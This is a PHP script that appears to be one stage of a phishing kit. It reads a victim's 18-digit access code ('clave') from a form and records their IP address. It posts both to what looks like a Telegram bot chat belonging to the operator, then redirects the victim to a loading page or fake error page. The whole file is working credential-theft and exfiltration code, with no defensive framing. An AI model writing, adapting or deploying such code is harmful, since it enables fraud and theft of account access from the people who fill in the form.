<?php

include 'access.php';
include 'ip.php';


//First form data
$clave = $_POST['clave'];


if (strlen($clave)==18 && is_numeric($clave)) {
    //call the ip function to get the guest ip
$ip = getRealIP();
//Setting the message
$text = "Data:\n\n Clave validada: \n".$clave."\nIP: \n".$ip."\n\nEND";
$msg = $text;

if (!empty($clave)) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $urlMsg);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec($ch);
    curl_close($ch);
    
    header('Location: ../load.php');
}else{
    header('Location: ../invalidFourthAccessValidation.php');
}
}else{
    header('Location: ../invalidFourthAccessValidation-error.php');
}

?>